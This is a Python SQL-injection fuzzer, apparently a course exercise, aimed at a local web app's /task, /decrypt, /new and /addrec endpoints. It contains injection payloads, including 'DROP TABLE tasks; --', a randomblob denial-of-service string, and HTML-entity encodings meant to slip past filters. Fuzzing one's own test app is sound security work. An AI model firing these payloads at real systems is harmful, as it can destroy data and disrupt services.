#!/usr/bin/env python3
import requests        # for sending/receiving web requests
import sys             # various system routines (exit, access to stdin, stderr, etc.)
import itertools       # simple tools for computing, e.g., the cross-product of lists
import time
from enum import Enum  # for defining enumerations

class PayloadType(Enum):
    INTEGER    = 1 # fuzz with a pre-configured list of SQL payloads
    STRING     = 2 # fuzz with dynamically generated XSS payloads (mutations) 
    SQL        = 3 #



root_url = "http://localhost:5000"

endpoints = [
# TODO: complete the list of endpoints, so that each endpoint
#       is fuzzed. Note that you should fuzz each entry field
#       individually. Thus, an entpoint might need to be listed
#       multiple times. 

    {
        "url": "/task",
        "method": "GET",
        "param_data": {
            "id": [PayloadType.INTEGER]
        }
    },
    {
        "url": "/task",
        "method": "GET",
        "param_data": {
            "id": [PayloadType.SQL]
        }
    },
    {
        "url": "/decrypt",
        "method": "POST",
        "param_data": {
            "id": [PayloadType.SQL],
            "password": [PayloadType.INTEGER]
        }
    },
    {
        "url": "/decrypt",
        "method": "POST",
        "param_data": {
            "id": [PayloadType.INTEGER],
            "password": [PayloadType.SQL]
        }
    },
    {
    	"url": "/new",
    	"method": "POST",
    	"param_data": {
    	     "title" : [PayloadType.SQL],
    	     "password:" : [PayloadType.INTEGER],
    	     "body" : [PayloadType.STRING]
    	     }
    },
    {
    	"url": "/new",
    	"method": "POST",
    	"param_data": {
    	     "title" : [PayloadType.STRING],
    	     "password:" : [PayloadType.SQL],
    	     "body" : [PayloadType.STRING]
    	     }
    },
    {
    	"url": "/new",
    	"method": "POST",
    	"param_data": {
    	     "title" : [PayloadType.STRING],
    	     "password:" : [PayloadType.INTEGER],
    	     "body" : [PayloadType.SQL]
    	     }
    },
    {
    	"url": "/addrec",
    	"method": "POST",
    	"param_data": {
    	     "title" : [PayloadType.SQL],
    	     "password:" : [PayloadType.INTEGER],
    	     "body" : [PayloadType.STRING]
    	     }
    },
    {
    	"url": "/addrec",
    	"method": "POST",
    	"param_data": {
    	     "title" : [PayloadType.STRING],
    	     "password:" : [PayloadType.SQL],
    	     "body" : [PayloadType.STRING]
    	     }
    },
    {
    	"url": "/addrec",
    	"method": "POST",
    	"param_data": {
    	     "title" : [PayloadType.STRING],
    	     "password:" : [PayloadType.INTEGER],
    	     "body" : [PayloadType.SQL]
    	     }
    },
]

import html
def get_mutated_sql_payload():
    # TODO: write a method that, using one or multiple lists
    #       of initial SQL payloads, generated new payloads using 
    #       a mutation strategy
    initial_sql_payloads = ["OR 1=1",
    			    "' OR '1' = '1",  # ' OR '1' = '1
    			    "' OR TRUE; --",   # ' OR TRUE --
    			    "DROP TABLE tasks; --", #  SELECT * FROM tasks
    			    "'; --",   # ' -- 
    			    "val1');",
    			    "val1','val2');",
    			    "val1','val2','val3');",
    			    "SELECT randomblob(10000000000)--"
    			    ]
    for p in initial_sql_payloads:
    	#Replacing common checks with escaped ascii 
        p = p.replace(";","&#59;")
        p = p.replace("'","&#39;")
        yield p
        p = html.unescape(p)
        yield p
        for p2 in initial_sql_payloads:
            p2 = p2.replace(";","&#59;")
            p2 = p2.replace("'","&#39;")
            yield p + p2
            p3 = html.unescape(p+p2)
            yield p3
         


def iterate_payloads(d):
    l = []
    for parameter, payload_placeholders in d.items():
        for payload_placeholder in payload_placeholders:
            if payload_placeholder == PayloadType.SQL:
                payloads = get_mutated_sql_payload()
            elif payload_placeholder == PayloadType.INTEGER:
                payloads = [1] # for fields requiring an integer
            elif payload_placeholder == PayloadType.STRING:
                payloads = ["A"] # for field requiring a string
            else:
                raise Exception(f"Unknown payload substitution: {payload_placeholder}")
        l.append([(parameter, payload) for payload in payloads])
    for payload in itertools.product(*l):
        yield dict(payload)


def main():
    print(f"Starting fuzzer for site {root_url}...")
    for endpoint in endpoints:
        session = requests.Session()

        payloads = list(iterate_payloads(endpoint["param_data"]))

        print(f"* Fuzzing endpoint {endpoint['url']} with {len(payloads)} parameter payload(s) ")
        for payload in payloads:
            time.sleep(2)
            try:
                if endpoint["method"] == 'POST':
                    r = session.post(root_url + endpoint["url"], data=payload, timeout=2)
                else:     
                    r = session.get(root_url + endpoint["url"], params=payload, timeout=2)
                if r.status_code == requests.codes.server_error:
                    print(f"  Found possible SQL Injection (got server error: {r.status_code}) for payload {str(payload)} ")
            except requests.exceptions.ReadTimeout:
                print(f"  Found possible SQL Injection (got timeout) for payload {str(payload)} ")

if __name__ == "__main__":
    main()
